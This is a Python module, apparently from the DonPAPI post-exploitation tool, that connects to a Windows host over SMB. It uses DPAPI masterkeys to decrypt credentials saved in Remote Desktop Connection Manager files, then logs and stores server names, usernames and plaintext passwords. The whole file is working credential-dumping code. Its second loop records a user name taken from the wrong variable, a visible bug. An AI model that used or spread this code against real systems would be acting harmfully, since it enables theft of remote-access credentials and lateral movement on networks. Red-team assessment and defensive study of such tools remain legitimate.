from typing import Any

from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.rdg import RDGTriage
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter


TAG = "RDCMan"

class RDCManagerDump:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore) -> None:
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context

    def run(self):
        self.logger.display("Dumping User's RDCManager")
        rdg_triage = RDGTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
        rdcman_files, rdgfiles = rdg_triage.triage_rdcman()
        for rdcman_file in rdcman_files:
            if rdcman_file is None:
                continue
            for rdg_cred in rdcman_file.rdg_creds:
                if rdg_cred.type in ["cred", "logon", "server"]:
                    log_text = "{} - {}:{}".format(rdg_cred.server_name, rdg_cred.username, rdg_cred.password.decode("latin-1")) if rdg_cred.type == "server" else "{}:{}".format(rdg_cred.username, rdg_cred.password.decode("latin-1"))
                    self.logger.secret(f"[{rdcman_file.winuser}][{rdg_cred.profile_name}] {log_text}",TAG)
                    self.context.db.add_secret(computer=self.context.host, collector=TAG, windows_user=rdcman_file.winuser, username=rdg_cred.username, password=rdg_cred.password.decode("latin-1"),target=rdg_cred.server_name if rdg_cred.type == "server" else "")         
        for rdgfile in rdgfiles:
            if rdgfile is None:
                continue
            for rdg_cred in rdgfile.rdg_creds:
                log_text = "{}:{}".format(rdg_cred.username, rdg_cred.password.decode("latin-1"))
                if rdg_cred.type == "server":
                    log_text = f"{rdg_cred.server_name} - {log_text}"
                self.logger.secret(f"[{rdgfile.winuser}][{rdg_cred.profile_name}] {log_text}",TAG)
                self.context.db.add_secret(computer=self.context.host, collector=TAG, windows_user=rdcman_file.winuser, username=rdg_cred.username, password=rdg_cred.password.decode("latin-1"),target=rdg_cred.server_name if rdg_cred.type == "server" else "")         